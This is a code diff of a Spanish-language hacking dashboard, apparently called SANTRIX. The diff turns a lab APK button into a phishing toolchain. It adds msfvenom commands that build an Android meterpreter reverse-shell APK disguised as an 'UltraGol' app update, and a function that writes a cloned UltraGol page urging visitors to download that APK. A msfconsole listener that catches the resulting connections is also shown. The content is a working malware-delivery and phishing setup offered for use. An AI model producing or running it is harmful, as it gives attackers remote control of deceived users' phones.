@@ -230,14 +230,41 @@
 
         <div class="tool-category">
             <span class="category-title">Mobile Experimentation</span>
-            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o public/downloads/lab_test_simple.apk && chmod +r public/downloads/lab_test_simple.apk')">
-                <span class="tool-name">Gen Simple APK</span>
-                <span class="tool-desc">Genera un APK básico sin codificación (más compatible con algunos dispositivos).</span>
+            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o public/downloads/ultragol_update.apk && chmod +r public/downloads/ultragol_update.apk')">
+                <span class="tool-name">Gen Phishing APK</span>
+                <span class="tool-desc">Genera el APK para camuflajear en la página de UltraGol.</span>
             </div>
-            <div class="tool-card" onclick="window.open('/downloads/lab_test_simple.apk', '_blank')">
-                <span class="tool-name">Download Simple APK</span>
-                <span class="tool-desc">Descarga la versión básica del APK.</span>
+            <div class="tool-card" onclick="createPhishingPage()">
+                <span class="tool-name">Deploy Phishing Page</span>
+                <span class="tool-desc">Crea una página clonada de UltraGol que descarga el APK automáticamente.</span>
             </div>
+            <script>
+                function createPhishingPage() {
+                    const content = `
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UltraGol - Actualización Requerida</title>
+    <style>
+        body { font-family: sans-serif; background: #0a0a0a; color: white; text-align: center; padding: 50px; }
+        .container { border: 1px solid #333; padding: 20px; border-radius: 10px; display: inline-block; }
+        .btn { background: #00ff00; color: black; padding: 15px 30px; text-decoration: none; font-weight: bold; border-radius: 5px; display: inline-block; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>¡Actualización de UltraGol!</h1>
+        <p>Para seguir disfrutando de los mejores partidos, descarga la última versión de nuestra app.</p>
+        <a href="/downloads/ultragol_update.apk" class="btn">DESCARGAR ACTUALIZACIÓN</a>
+    </div>
+</body>
+</html>`;
+                    runCommand("cat << 'EOF' > public/ultragol.html\\n" + content + "\\nEOF");
+                    alert("Página creada en /ultragol.html. ¡Ábrela en tu móvil!");
+                }
+            </script>
             <div class="tool-card" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
                 <span class="tool-name">Start Mobile Listener</span>
                 <span class="tool-desc">Prepara SANTRIX para recibir la conexión de tu teléfono.</span>
